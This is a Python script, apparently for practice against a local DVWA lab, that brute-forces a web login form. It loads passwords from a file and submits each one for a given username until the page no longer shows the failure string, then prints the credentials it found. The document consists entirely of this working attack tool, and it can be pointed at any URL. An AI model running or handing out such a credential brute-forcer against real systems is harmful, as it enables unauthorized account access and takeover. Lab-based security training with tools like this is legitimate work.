import mechanicalsoup
from termcolor import colored

browser = mechanicalsoup.StatefulBrowser()

url = input('[+] Enter Page URL: ') or "http://localhost/dvwa/login.php"
browser.open(url)

username = input('[+] Enter Username For The Account To Bruteforce: ') or "admin"

password_file = input('[+] Enter Password File To Use: ') or "PassFile.txt"

login_failed_string = input('[+] Enter String That Occurs When Login Fails: ') or "Login failed"


def brute_force():
    for password in passwords:
        password = password.strip()
        browser.select_form('form[action="login.php"]')
        browser["username"] = username
        browser["password"] = password
        response = browser.submit_selected()
        if login_failed_string in response.text:
            response = ""
            pass
        else:
            print(colored(('[+] Found Username: ==> ' + username), 'green'))
            print(colored(('[+] Found Password: ==> ' + password), 'green'))
            break


with open(password_file, 'r') as passwords:
    brute_force()